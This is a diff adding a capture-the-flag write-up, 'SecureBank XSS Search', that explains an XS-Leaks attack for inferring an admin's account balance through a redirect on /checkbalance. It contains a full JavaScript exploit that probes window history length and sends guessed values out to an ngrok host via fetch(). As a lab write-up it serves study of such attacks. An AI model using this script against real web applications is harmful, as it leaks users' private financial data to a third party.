@@ -1,0 +1,60 @@
+<h3>SecureBank XSS Search</h3>
+
+<p>This challenge required us to find out the account balance of the admin.</p>
+
+<p>Looking carefully at the responses received from the web application, we would realise that the <code>/checkbalance</code> endpoint is vulnerable to a class of vulnerabilities known as <a href="https://xsleaks.dev">XS Leaks</a>.</p>
+
+<p>If the queried amount is more than the actual balance in the user's account, the user is redirected. Otherwise, no redirection occurs. It would be possible to get the length of the window's history to check whether this redirection is occurred, allowing us to perform an "XS Search" on the user's account balance.</p>
+
+<p>To obey the Same Origin Policy (SOP), we would need to do the following:</p>
+
+<ol>
+<li>From the exploit server, open <code>http://10.8.201.87:5000/checkbalance?amount=${num}</code> as a new window.</li>
+<li>Wait for the site to load. Depending on the balance, the window may be redirected to <code>/</code>.</li>
+<li>Change the window's location back to the exploit server, so that both the original and new windows are of the same origin</li>
+<li>We can now check the window's <code>history.length</code> attribute to determine if a redirect occurred in step 2.</li>
+</ol>
+
+<p>After some trial and error, here's my final script.</p>
+
+<p>```markup
+<html>
+    <body>
+        <script></p>
+
+<pre><code>        const sleep = (ms) =&gt; {
+            return new Promise(resolve =&gt; setTimeout(resolve, ms));
+        }
+
+        const tryNumber = async (num) =&gt; {
+
+            let opened = window.open(`http://10.8.201.87:5000/checkbalance?amount=${num}`);
+            await sleep(2000);
+            opened.location = "http://24cf-115-66-128-224.ngrok.io/nothing.txt";
+            await sleep(2000);
+            console.log(opened.history.length)
+            if (opened.history.length === 3) {
+                return [false, num];
+            }
+            else {
+                return [true, num];
+            }
+        }
+
+        (async () =&gt; {
+            for (let i = 97280; i &lt;= 97290; i+=1) {
+                tryNumber(i).then(res =&gt; {
+                    let [success, guess] = res;
+                    console.log(guess, success);
+                    if (success === true) {fetch("http://24cf-115-66-128-224.ngrok.io/" + `${guess}`)}
+                })
+            }
+        })();
+    &lt;/script&gt;
+&lt;/body&gt;
+</code></pre>
+
+<p></html>
+```</p>
+
+<p>On line 25, I started with larger intervals, then slowly narrowed down the exact value by decreasing the interval range.</p>
